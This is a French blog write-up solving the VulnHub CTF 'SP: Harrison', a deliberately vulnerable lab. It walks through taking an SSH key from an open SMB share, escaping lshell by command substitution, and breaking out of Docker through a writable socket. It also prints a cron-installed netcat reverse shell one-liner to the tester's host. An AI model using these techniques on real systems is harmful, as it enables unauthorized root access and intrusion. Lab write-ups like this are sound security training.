# Solution du CTF SP: Harrison de VulnHub

Toujours la suite de cette série de CTFs ayant pour thème la série South Park. Ce CTF [SP: harrison](https://vulnhub.com/entry/sp-harrison,302/) est certainement l'un des plus difficiles du lot.

Le synopsis est le suivant :

> Can you break free from Harrison's prison?

Et il nous faut récupérer uniquement le flag de root.

```
Nmap scan report for 192.168.56.80
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5b87f1fe678fa6ba8b753c11343db6b8 (RSA)
|   256 93877e2e5e4ece7156a11c6bfc1f6e55 (ECDSA)
|_  256 c014c024e8a87ed4cda64225f3484794 (ED25519)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:EC:32:A5 (Oracle VirtualBox virtual NIC)
Service Info: Host: HARRISON; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-12-20T17:48:17
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: harrison
|   NetBIOS computer name: HARRISON\x00
|   Domain name: \x00
|   FQDN: harrison
|_  System time: 2022-12-20T17:48:14+00:00
|_clock-skew: mean: 59m58s, deviation: 1s, median: 59m57s
```

On ne part pas avec grand chose... Forcément on se dirige immédiatement vers le SMB :

```shellsession
$ smbclient -U "" -N -L //192.168.56.80

        Sharename       Type      Comment
        ---------       ----      -------
        Private         Disk      
        IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
SMB1 disabled -- no workgroup available
$ smbclient -U "" -N //192.168.56.80/Private
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 18 18:55:51 2019
  ..                                  D        0  Thu Apr 18 18:12:55 2019
  .bash_logout                        H      220  Wed Apr  4 20:30:26 2018
  .profile                            H      807  Wed Apr  4 20:30:26 2018
  .bashrc                             H     3771  Wed Apr  4 20:30:26 2018
  silly_cats                          D        0  Thu Apr 18 18:55:51 2019
  .ssh                               DH        0  Thu Apr 18 18:42:57 2019
  flag.txt                            N       32  Thu Apr 18 18:14:18 2019

                32894736 blocks of size 1024. 27322872 blocks available
smb: \> cd .ssh
smb: \.ssh\> ls
  .                                   D        0  Thu Apr 18 18:42:57 2019
  ..                                  D        0  Thu Apr 18 18:55:51 2019
  authorized_keys                     N      399  Thu Apr 18 18:42:57 2019
  id_rsa                              A     1679  Thu Apr 18 18:14:17 2019
  id_rsa.pub                          A      399  Thu Apr 18 18:14:17 2019

                32894736 blocks of size 1024. 27322872 blocks available
smb: \.ssh\> get id_rsa
getting file \.ssh\id_rsa of size 1679 as id_rsa (409,9 KiloBytes/sec) (average 409,9 KiloBytes/sec)
smb: \.ssh\> pwd
Current directory is \\192.168.56.80\Private\.ssh\
smb: \.ssh\> get id_rsa.pub
getting file \.ssh\id_rsa.pub of size 399 as id_rsa.pub (97,4 KiloBytes/sec) (average 253,7 KiloBytes/sec)
```

## Prison break

J'ai choppé la clé privée SSH comme ça on peut obtenir notre shell mais on découvre bien vite qu'il est limité :

```
$ ssh -i id_rsa harrison@192.168.56.80

Welcome to Harrison. Enjoy your shell.

Type '?' or 'help' to get the list of allowed commands
harrison:~$ id
*** forbidden command: id
```

Une recherche sur le web pour la phrase *to get the list of allowed commands* nous retourne des références à `lshell` déjà croisé sur [Kioptrix: 1.3](https://github.com/devl00p/blog/blob/db5fe862db386ad078af26f79dd725069530ef5e/ctf_writeups/Solution%20du%20CTF%20Kioptrix:%201.3%20de%20VulnHub.md#i-wont-let-it-happen).

Certaines erreurs sont encore plus parlantes :

```
harrison:~$ cd --help
lshell: --help: No such file or directory
```

Sur Kioptrix je m'en était sorti avec une vulnérabilité dans lshell qui consistait à appeler du code Python mais là ça ne fonctione pas.

J'ai fouillé dans les issues du projet Github de `lshell` et je suis tombé sur celle ci : [Prevent shell execution tag in command parameters](https://github.com/ghantoos/lshell/issues/205)

Cela me permet effectivement d'échapper aux restrictions même si je n'obtiens pas l'output de mes commandes :

```shellsession
harrison:~$ cat flag.txt
*** forbidden command: cat
harrison:~$ echo "$(cat flag.txt)"
It's not going to be that easy.
harrison:~$ echo "$(bash)"
harrison@harrison:~$ id
harrison@harrison:~$
```

La situation est vite corrigée en passant à un reverse-ssh.

Malgré que le hostname semble choisi par un humain je remarque bien vite que une bonne partie des commandes systèmes sont manquantes et qu'un `.dockerenv` est présent à la racine du système de fichier.

Sans les commandes `ip`, `ifconfig` et `netstat` on peut obtenir notre adresse IP en lisant un fichier particulier qui terminera de confirmer qu'on est dans un container Docker :

```shellsession
harrison@harrison:/home/harrison$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/30 2 0 2
           |-- 172.17.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/30 2 0 2
           |-- 172.17.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST
```

L'utilisateur root a un fichier `flag.txt` lisible mais il n'y a rien d'intéressant :

```shellsession
harrison@harrison:/home/harrison$ cat /root/flag.txt
Nope. No flags here. Where do you think you are?
```

## The escapist

Bien que l'on ne soit pas root et que je ne vois pas de méthodes particulières de le devenir sur ce container, j'ai tout de même un accès en écriture sur `/var/run/docker.sock`.

Je peux me baser sur la méthodologie présente sur [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-docker-socket) qui consiste à envoyer des requêtes HTTP sur le fichier socket en l'absence des commandes Docker :

```shellsession
harrison@harrison:/home/harrison$ curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1555615921,"Id":"sha256:6275c2bd4f72c6c417458fa6caecf2bc23bf823298650334c3c3bd42579aa95f","Labels":null,"ParentId":"sha256:48023286ce2db59417c29372f464aa5423a18d583f925c6173d205ccccc3df1f","RepoDigests":null,"RepoTags":["cont1:v1"],"SharedSize":-1,"Size":345807155,"VirtualSize":345807155},{"Containers":-1,"Created":1552350017,"Id":"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499","Labels":null,"ParentId":"","RepoDigests":["ubuntu@sha256:017eef0b616011647b269b5c65826e2e2ebddbe5d1f8c1e56b3599fb14fabec8"],"RepoTags":["ubuntu:latest"],"SharedSize":-1,"Size":88908191,"VirtualSize":88908191}]
harrison@harrison:/home/harrison$ curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"sha256:6275c2bd4f72c6c417458fa6caecf2bc23bf823298650334c3c3bd42579aa95f","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
{"Id":"bbb0103221a88b370f654897c3b7d18c9621c32cdc3f66fab898ae3c6fad482d","Warnings":null}
harrison@harrison:/home/harrison$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/bbb0103221a88b370f654897c3b7d18c9621c32cdc3f66fab898ae3c6fad482d/start
harrison@harrison:/home/harrison$ socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/bbb0103221a88b370f654897c3b7d18c9621c32cdc3f66fab898ae3c6fad482d/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

HTTP/1.1 101 UPGRADED
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp

id
'uid=0(root) gid=0(root) groups=0(root)
pwd
/home/harrison
hostname
bbb0103221a8
cd /host_root
cd root
ls
        flag.txt
cat flag.txt
IDo you think you are out?


Just kidding, here is your flag: 1xcDF933mce
```

La dernière étape (ci dessus) demande un peu de préparation puisqu'il faut coller la requête HTTP avec l'ID du container sur l'entrée standard. Il aura aussi fallut rappatrier un `socat` compilé statiquement (ça se trouve sur Github).

La seconde commande cURL génère un container à partir de l'image Docker Ubuntu trouvée dans l'output de la première commande. Parmi les options de la création du container il y a les points de montage qui indiquent de monter la racine de l'hôte dans le dossier `/host_root` du container. C'est pour cela que je trouve le vrai flag à l'intérieur.

Pour aller plus loin et obtenir un vrai shell je peux ajouter une entrée crontab dans l'hôte (par exemple dans `/var/spool/cron/crontabs/root` ):

```bash
* * * * *  bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 80 >/tmp/f
```

Cette fois ça marche. J'ai juste la sortie standard qui ne s'affiche pas mais je peux l'obtenir en la redirigant vers le flux d'erreur :

```shellsession
$ ncat -l -p 80 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.56.80.
Ncat: Connection from 192.168.56.80:60282.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname

# ip addr

# ip addr 1>&2
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:ec:32:a5 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.80/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 513sec preferred_lft 513sec
    inet6 fe80::a00:27ff:feec:32a5/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:7a:53:21:ca brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:7aff:fe53:21ca/64 scope link 
       valid_lft forever preferred_lft forever
5: vethf29bea2@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether ee:48:b8:89:39:18 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::ec48:b8ff:fe89:3918/64 scope link 
       valid_lft forever preferred_lft forever
7: veth69428f3@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 16:b6:c6:76:1e:f9 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::14b6:c6ff:fe76:1ef9/64 scope link 
       valid_lft forever preferred_lft forever
```

## Sous le capot

Dans l'hôte on trouve deux containers en fonctionnement :

```shellsession
root@harrison:~# docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                      NAMES
bbb0103221a8        6275c2bd4f72        "/bin/sh -c '/etc/in…"   16 minutes ago      Up 16 minutes                                                  eager_jepsen
5142b34c5cb2        cont1:v1            "/bin/sh -c '/etc/in…"   36 minutes ago      Up 36 minutes       0.0.0.0:22->22/tcp, 0.0.0.0:445->445/tcp   dazzling_wing
```

Le premier est celui que l'on a créé et l'autre est celui du CTF.

Je retrouve d'ailleurs le `Dockerfile` dans le dossier `/home/harrison/cont1` :

```dockerfile
FROM ubuntu:latest
USER root
RUN echo printf \"Welcome to Harrison! Enjoy your shell.\" > /etc/update-motd.d/00-header
RUN echo > /etc/legal
RUN echo > /etc/update-motd.d/10-help-text
RUN echo > /etc/update-motd.d/50-motd-news
RUN echo > /etc/update-motd.d/60-unminimize
RUN useradd -ms /bin/bash harrison
RUN usermod -aG sudo harrison
RUN apt-get -qq update
RUN apt-get install -y -qq curl openssh-server samba netcat-openbsd
RUN mkdir /home/harrison/.ssh
RUN ssh-keygen -q -t rsa -N '' -f /home/harrison/.ssh/id_rsa
RUN echo "Nope. No flags here. Where do you think you are?" > /root/flag.txt
RUN echo "It's not going to be that easy." > /home/harrison/flag.txt
RUN echo "[global]\nmap to user = Bad User\n" > /etc/samba/smb.conf
RUN echo "[Private]\npath = /home/harrison\nguest ok = yes\nbrowseable = yes\nread only = yes\n" >> /etc/samba/smb.conf
RUN chmod 755 /root
RUN chmod 744 /root/flag.txt
RUN chmod -R 755 /home/harrison/.ssh
RUN chown -R harrison:harrison /home/harrison/.ssh
RUN usermod -s /usr/bin/lshell harrison
RUN cat /home/harrison/.ssh/id_rsa.pub >> /home/harrison/.ssh/authorized_keys
COPY lshell/ /usr/share/lshell
WORKDIR /usr/share/lshell
RUN python setup.py install --install-scripts=/usr/bin
COPY silly_cats /home/harrison/silly_cats
RUN groupadd docker
RUN groupmod -g 999 docker
RUN usermod -aG docker harrison
ENTRYPOINT /etc/init.d/smbd start && /etc/init.d/ssh start && bash
WORKDIR /home/harrison
```

*Publié le 21 décembre 2022*
